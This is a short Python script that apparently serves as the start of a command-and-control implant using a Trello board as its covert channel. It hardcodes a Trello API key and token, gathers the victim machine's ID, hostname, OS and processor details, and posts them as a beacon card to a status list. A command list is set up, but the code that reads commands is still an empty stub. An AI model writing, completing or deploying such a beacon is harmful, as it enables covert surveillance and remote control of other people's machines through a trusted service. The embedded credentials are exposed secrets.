from trello import TrelloClient
import platform
import uuid
import os
import socket

api = "31ec916f741962caeb3b4d2ca1fd43b7"
token = "ATTA499aed423e1f8c8d9e6b7342e9fdc93a88053e51526037e58616fb50867236033EB1F029"
board_id = "8Gjc8fX8"
status_list_id = "69a946c9af7564bacbed187d"
command_list_id = "69a946cd58f076e0489335cb"

client = TrelloClient(
    api_key=api,
    api_secret=token,
)

board = client.get_board(board_id=board_id)
status_list = board.get_list(status_list_id)
command_list = board.get_list(command_list_id)


def _get_unique_id():
    if platform.system() == "Linux":
        if os.path.exists("/etc/machine-id"):
            with open("/etc/machine-id", "r") as f:
                return f.read().strip()
    return hex(uuid.getnode())


def main():
    _announce()


def _announce():
    system_info_list = [
        f"Unique ID:    {_get_unique_id()}",
        f"Hostname:     {socket.gethostname()}",
        f"OS Name:      {platform.system()}",
        f"OS Release:   {platform.release()}",
        f"OS Version:   {platform.version()}",
        f"Machine:      {platform.machine()}",
        f"Processor:    {platform.processor()}",
        f"Python:       {platform.python_version()}",
        f"Platform:     {platform.platform()}"
    ]
    system_desc = "\n".join([f"* {item}" for item in system_info_list[1:]])
    status_list.add_card(
        name=system_info_list[0],
        desc=system_desc,


    )


def _update_status():
    pass


if __name__ == "__main__":
    main()
